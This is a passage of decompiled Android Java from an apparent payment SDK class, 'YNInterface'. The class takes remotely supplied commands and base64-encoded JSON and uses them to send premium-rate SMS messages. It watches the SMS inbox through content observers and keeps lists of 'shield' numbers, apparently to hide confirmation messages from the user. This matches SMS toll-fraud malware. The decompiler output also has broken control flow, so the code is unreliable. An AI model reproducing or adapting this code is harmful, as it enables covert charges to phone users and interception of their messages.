        this.jdField_a_of_type_ComLpSdkYninterfaceServiceSmsContentObserver.setBaoyuesendnumber(paramString);
        this.ctx.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, this.jdField_a_of_type_ComLpSdkYninterfaceServiceSmsContentObserver);
        SmsManager.getDefault().sendTextMessage(localObject2[2], null, localObject2[1], this.jdField_b_of_type_AndroidAppPendingIntent, null);
        return;
        if (localObject2.length < 5)
        {
          localObject1 = localObject2[3];
          paramString = localObject2[3];
        }
        else
        {
          localObject1 = localObject2[3];
          paramString = localObject2[4];
        }
      }
    }
    if (paramString.startsWith("FASTFUN"))
    {
      n();
      return;
    }
    if (paramString.startsWith("RONGYU"))
    {
      h(paramString.split(",")[1]);
      return;
    }
    if (paramString.startsWith("WUXIANCHUANGJIE"))
    {
      g(paramString.split(",")[1]);
      return;
    }
    if (paramString.startsWith("FAST-FUNYEYOU"))
    {
      localObject1 = paramString.split(",")[1];
      paramString = paramString.split(",")[2];
      this.jdField_a_of_type_ComLpSdkYninterfaceServiceSmsContentObserver.setNumber("106588995604");
      this.jdField_a_of_type_ComLpSdkYninterfaceServiceSmsContentObserver.setBaoyuesendnumber((String)localObject1);
      this.ctx.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, this.jdField_a_of_type_ComLpSdkYninterfaceServiceSmsContentObserver);
      SmsManager.getDefault().sendTextMessage((String)localObject1, null, paramString, this.jdField_i_of_type_AndroidAppPendingIntent, null);
      return;
    }
    if (paramString.startsWith("JIESHENGDADDO"))
    {
      localObject1 = paramString.split(",")[1];
      paramString = paramString.split(",")[2];
      this.jdField_a_of_type_ComLpSdkYninterfaceServiceSmsContentObserver.setNumber((String)localObject1);
      this.ctx.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, this.jdField_a_of_type_ComLpSdkYninterfaceServiceSmsContentObserver);
      new Thread(new YNInterface.6(this, paramString)).start();
      return;
    }
    if (paramString.startsWith("GUANGZHOUPUSHI"))
    {
      localObject1 = paramString.split(",")[1];
      localObject2 = paramString.split(",")[2];
      paramString = paramString.split(",")[3];
      PushSDK.setDebugMode(true);
      PushApplicationInit.init(this.ctx, (String)localObject1, (String)localObject2, paramString);
      PushSDK.INSTANCE.init(this.ctx, this.jdField_a_of_type_ComPush2SdkPushListener$OnInitListener);
      return;
    }
    if (paramString.startsWith("JSON")) {}
    for (;;)
    {
      try
      {
        paramString = new JSONObject(paramString.substring(4));
        this.aa = paramString.getString("port");
        this.ab = paramString.getString("mo");
        if ((!paramString.getString("port2").equals("")) || (!paramString.getString("mo2").equals("")))
        {
          this.ac = paramString.getString("port2");
          this.ad = paramString.getString("mo2");
        }
        if (paramString.getBoolean("base64"))
        {
          this.ab = new String(Base64.decode(this.ab, 0));
          if (!this.ad.equals("")) {
            continue;
          }
          paramString = "";
          this.ad = paramString;
        }
      }
      catch (JSONException paramString)
      {
        paramString.printStackTrace();
        continue;
      }
      if ((this.aa == null) || (this.ab == null)) {
        break;
      }
      this.ae = "ceshimsg";
      SmsManager.getDefault().sendTextMessage(this.aa, null, this.ab, this.jdField_a_of_type_AndroidAppPendingIntent, null);
      L.i("发送支付短信 ::" + this.aa + "::" + this.ab);
      return;
      paramString = new String(Base64.decode(this.ad, 0));
      continue;
      if (paramString.contains(";"))
      {
        this.jdField_b_of_type_ArrayOfJavaLangString = paramString.split(";");
        this.aa = this.jdField_b_of_type_ArrayOfJavaLangString[0].split(",")[0];
        this.ab = this.jdField_b_of_type_ArrayOfJavaLangString[0].split(",")[1];
        this.ac = this.jdField_b_of_type_ArrayOfJavaLangString[1].split(",")[0];
        this.ad = this.jdField_b_of_type_ArrayOfJavaLangString[1].split(",")[1];
      }
      else
      {
        this.aa = paramString.substring(0, paramString.indexOf(","));
        this.ab = paramString.substring(paramString.indexOf(",") + 1);
      }
    }
  }
  
  public void sendinitmsgdialog()
  {
    AlertDialog.Builder localBuilder = new AlertDialog.Builder(this.ctx);
    localBuilder.setTitle("提示");
    localBuilder.setMessage("你将发送短信到12114,资费0.1元,进入话费支付请求");
    localBuilder.setCancelable(true);
    localBuilder.setPositiveButton("确定", new YNInterface.15(this));
    localBuilder.setNegativeButton("取消", new YNInterface.16(this));
    localBuilder.show();
  }
  
  public void setInitSuccess(boolean paramBoolean)
  {
    this.p = paramBoolean;
  }
  
  public void setPayListener(PayListener paramPayListener)
  {
    this.jdField_a_of_type_ComLpSdkYninterfacePayListener = paramPayListener;
  }
  
  public void setShieldNum()
  {
    StringBuffer localStringBuffer = new StringBuffer();
    Iterator localIterator = SMSCodeBroadcast.getShieldStrs().iterator();
    for (;;)
    {
      if (!localIterator.hasNext())
      {
        UtilPerference.setShieldStr(localStringBuffer.toString());
        return;
      }
      String str = (String)localIterator.next();
      if (StrUtil.notEmptyOrNull(str)) {
        if (localStringBuffer.length() == 0) {
          localStringBuffer.append(str);
        } else {
          localStringBuffer.append("," + str);
        }
      }
    }
  }
  
  public void showprogressDialog()
  {
    this.jdField_a_of_type_AndroidAppProgressDialog = new ProgressDialog(this.ctx);
    this.jdField_a_of_type_AndroidAppProgressDialog.setTitle("正在支付请等待");
    this.jdField_a_of_type_AndroidAppProgressDialog.setMessage("支付中,请耐心等待...");
    this.jdField_a_of_type_AndroidAppProgressDialog.setCanceledOnTouchOutside(false);
    this.jdField_a_of_type_AndroidAppProgressDialog.setOnKeyListener(this.jdField_a_of_type_AndroidContentDialogInterface$OnKeyListener);
    this.jdField_a_of_type_AndroidAppProgressDialog.show();
  }
  
  public void unRegisterReceiver()
  {
    
    if ((this.ctx == null) || (this.jdField_c_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver != null)) {}
    try
    {
      L.i("注销发送状态监听");
      this.ctx.unregisterReceiver(this.jdField_c_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver);
      if (this.jdField_a_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver != null) {}
      try
      {
        this.ctx.unregisterReceiver(this.jdField_a_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver);
        if (this.jdField_b_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver != null) {}
        try
        {
          this.ctx.unregisterReceiver(this.jdField_b_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver);
          if (this.d != null) {}
          try
          {
            this.ctx.unregisterReceiver(this.d);
            if (this.jdField_e_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver != null) {}
            try
            {
              this.ctx.unregisterReceiver(this.jdField_e_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver);
              if (this.jdField_f_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver != null) {}
              try
              {
                this.ctx.unregisterReceiver(this.jdField_f_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver);
                if (this.h != null) {}
                try
                {
                  this.ctx.unregisterReceiver(this.h);
                  if (this.jdField_i_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver != null) {}
                  try
                  {
                    this.ctx.unregisterReceiver(this.jdField_i_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver);
                    return;
                  }
                  catch (Exception localException1) {}
                }
                catch (Exception localException2)
                {
                  for (;;) {}
                }
              }
              catch (Exception localException3)
              {
                for (;;) {}
              }
            }
            catch (Exception localException4)
            {
              for (;;) {}
            }
          }
          catch (Exception localException5)
          {
            for (;;) {}
          }
        }
        catch (Exception localException6)
        {
          for (;;) {}
        }
      }
      catch (Exception localException7)
      {
        for (;;) {}
      }
    }
    catch (Exception localException8)
    {
      for (;;) {}
    }
  }
}
